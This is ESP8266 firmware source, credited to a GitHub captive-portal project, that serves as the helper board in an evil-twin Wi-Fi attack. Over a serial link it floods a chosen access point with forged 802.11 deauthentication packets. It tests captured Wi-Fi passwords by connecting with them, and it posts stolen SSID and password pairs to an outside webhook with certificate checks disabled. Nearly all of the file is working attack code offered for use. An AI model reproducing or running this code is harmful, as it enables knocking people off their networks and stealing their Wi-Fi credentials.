////////////////////////////////////////////////////
//              Made By HEINZGUENTER              //
// github.com/heinzguenter/ESP8266-Captive-Portal //
////////////////////////////////////////////////////

#include <SoftwareSerial.h>
#include <ESP8266WiFi.h>
#include <ESP8266HTTPClient.h>

SoftwareSerial esp(D1, D2);

String readString;
bool deauthing = true;

String splitReadString() {
  String rtn = readString.substring(0, readString.indexOf('|'));
  readString = readString.substring(readString.indexOf('|') + 1);

  return rtn;
}

void serialCommand(){
  readString = "";

  while (esp.available()) {
    delay(3);
    if (esp.available() > 0) {
      char c = esp.read();
      readString += c;
    }
  }

  if(readString.length() > 0){
    String command = splitReadString();
    
    if(command == "deauth"){
      int channel = splitReadString().toInt();

      String mac = splitReadString();

      deauth(channel, mac);
    }

    if(command == "webhook"){
      String url; String ssid; String pass;

      while (!esp.available()) { delay(1); }
      while (esp.available()) { delay(3); char c = esp.read(); url += c; }

      while (!esp.available()) { delay(1); }
      while (esp.available()) { delay(3); char c = esp.read(); ssid += c; }

      while (!esp.available()) { delay(1); }
      while (esp.available()) { delay(3); char c = esp.read(); pass += c; }

      sendWebhook(url, ssid, pass);
    }

    if(command == "validate"){
      String targetSSID = splitReadString();

      String pass = splitReadString();

      validate(targetSSID, pass);
    }

    if(command == "stopDeauthing"){ deauthing = false; }
  }
}

void deauth(const int channel, String BSSIDstr){
  deauthing = true;
  uint8_t bssid[6];
  sscanf(BSSIDstr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &bssid[0], &bssid[1], &bssid[2], &bssid[3], &bssid[4], &bssid[5]); //convert the mac adress from String to uint8_t

  uint8_t deauthPacket[26] = { //defining the preset for the deauthing package
      /*  0 - 1  */ 0xC0, 0x00, //type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00, //duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,//reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, //BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00, //fragment & squence number
      /* 24 - 25 */ 0x01, 0x00 //reason code (1 = unspecified reason)
    };

  for (int i = 0; i < 6; i++){ //insert the mac adress into the deauther packet
      deauthPacket[i + 10] = bssid[i];
      deauthPacket[i + 16] = bssid[i];
  }
  
  if (channel != WiFi.channel()){ wifi_set_channel(channel); delay(100); } //switch to the channel of the network that we want to deauth

  int i; digitalWrite(D4, LOW); //enable the deauting LED
  while(deauthing == true && WiFi.status() != 3) {
    serialCommand(); //check if other commands are beeing send over serial
    wifi_send_pkt_freedom(deauthPacket, 26, 0); //send the deauthing package
    delay(10); i++;
  }
  digitalWrite(D4, HIGH); //disable de deauthing LED
}

void validate(const String &targetSSID, const String &pass){
  if (WiFi.status() == 3){ WiFi.disconnect(); } //if allready conected to a network: disconect from it
  WiFi.begin(targetSSID, pass); //try to connect with the provided credentials
    
  int time = millis(); int i = 0;
  while (WiFi.status() != 3 && WiFi.status() != 4 && millis() - time < 10 * 1000){ delay(250); i++; } //wait until the wifi is conected, the wrong password status is set or the timeout triggered
  esp.printf("wifiStatus|%i", WiFi.status()); //send the wifi code to the master
  esp.printf("It took %i seconds\n\n", i/4);
}

void sendWebhook(const String url, const String ssid, const String pass) {
  WiFiClientSecure client; HTTPClient https;
  int httpCode = 255;

  if (client) {
    client.setInsecure(); //Disable SSL certificate verification
    
    if (https.begin(client, url)){
      https.addHeader("Content-Type", "application/json"); //Set request as JSON

      int i;
      while (httpCode != 200 || i > 5){ //send post request until http code is 200
        httpCode = https.POST("{'ssid':'" + ssid + "','pass':" + pass + "}"); //send post request
        esp.printf("Webhook HTTP code %i\n\n", httpCode);
        delay(500); i++;
      }
      
      if (httpCode == 200 || i > 5) { https.end(); } //ifrequest is send successfully stop the http client
    }
  }
}

void setup() {
  esp.begin(115200);

  WiFi.mode(WIFI_STA); WiFi.disconnect(); //setting up the wifi
  pinMode(D4, OUTPUT); digitalWrite(D4, HIGH); //setting up the deauthing LED
  pinMode(D3, OUTPUT); //setting up the connection LED
}

void loop() {
  serialCommand(); //check for commands over serial

  if(WiFi.status() == 3 && digitalRead(D3) == LOW) { digitalWrite(D3, HIGH); } //if conected and the LED is off turn it on
  else if(WiFi.status() != 3 && digitalRead(D3) == HIGH){ digitalWrite(D3, LOW); } //if the LED is on but the ESP is not connected turn it of
}